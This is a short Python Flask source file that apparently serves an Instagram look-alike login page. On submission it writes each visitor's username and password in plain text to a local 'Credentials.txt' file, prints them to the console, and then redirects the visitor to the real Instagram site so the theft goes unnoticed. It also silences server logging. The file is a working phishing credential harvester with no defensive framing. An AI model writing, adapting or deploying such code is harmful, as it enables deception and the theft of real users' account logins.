import os
import subprocess
from flask import Flask, request, render_template, redirect
import flask.cli
import logging


flask.cli.show_server_banner = lambda *a, **k: None
logging.getLogger('werkzeug').setLevel(logging.ERROR)

app = Flask(__name__)


@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        username = request.form.get("u_name")
        password = request.form.get("pass")

        path = "insta_Credentials"
        os.makedirs(path, exist_ok=True)
        full = os.path.join(path, "Credentials.txt")

        if username and password:
            with open(full, "a") as f:
                f.write(f"Username/Email: {username} | Password: {password}\n")
                print(f"✅ Save Information: {username} - {password} -")

            return redirect("https://www.instagram.com/")
        else:
            return "Please provide both username and password."

    return render_template("insta.html")


def run():
    app.run(host="0.0.0.0", port=5001, debug=False, use_reloader=False)
